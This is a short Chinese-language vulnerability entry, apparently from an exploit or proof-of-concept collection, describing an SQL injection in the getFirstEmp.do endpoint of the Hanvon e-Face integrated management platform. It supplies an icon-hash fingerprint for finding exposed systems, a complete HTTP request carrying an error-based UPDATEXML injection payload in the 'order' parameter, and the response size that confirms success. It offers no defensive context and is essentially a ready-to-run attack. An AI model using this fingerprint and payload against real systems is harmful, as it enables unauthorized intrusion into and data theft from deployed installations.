# 汉王e脸通综合管理平台getFirstEmp存在SQL注入漏洞

汉王e脸通综合管理平台 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="1380907357"`
- **请求**：`GET /manage/firstPeopleOpen/getFirstEmp.do?recoToken=67mds2pxXQb&page=1&pageSize=10&groupId=1&order=(UPDATEXML(2920,CONCAT(0x7e,MD5(123123),0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1`
- **响应特征**：200 55235